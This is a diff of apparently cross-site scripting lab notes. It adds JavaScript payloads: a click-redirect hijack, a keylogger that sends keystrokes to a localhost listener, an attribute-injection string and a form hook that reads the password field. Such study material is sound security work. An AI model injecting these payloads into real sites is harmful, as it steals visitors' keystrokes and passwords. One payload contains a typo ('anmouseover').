@@ -74,12 +74,34 @@ function CaughtClick(){
   alert("You clicked");
 }
 document.body.addEventListener('click', CaughtClick, true);
+```
 
-
+```
+function CaughtClick(){
+  location.href = "https://google.es";
+}
+document.body.addEventListener('click', CaughtClick, true);
 ```
 
 ### 7. Keystroke logging
+```
+> python -m SimpleHTTPServer 8000
+document.onkeypress = function Keylogger(inp){
+  key_pressed = String.fromCharCode(inp.which);
+  new Image().src = "http://localhost:9000/?" + key_pressed;
+}
+```
+
 ### 8. Event listener
+```
+" anmouseover="alert(1);
+
+document.forms[0].onsubmit = function demo(){
+  var pass = document.forms[0].elements[1].value;
+  alert(pass);
+}
+```
+
 ### 9. Include external
 ### 10. Include external js using
 ### 11. Solution replace banner
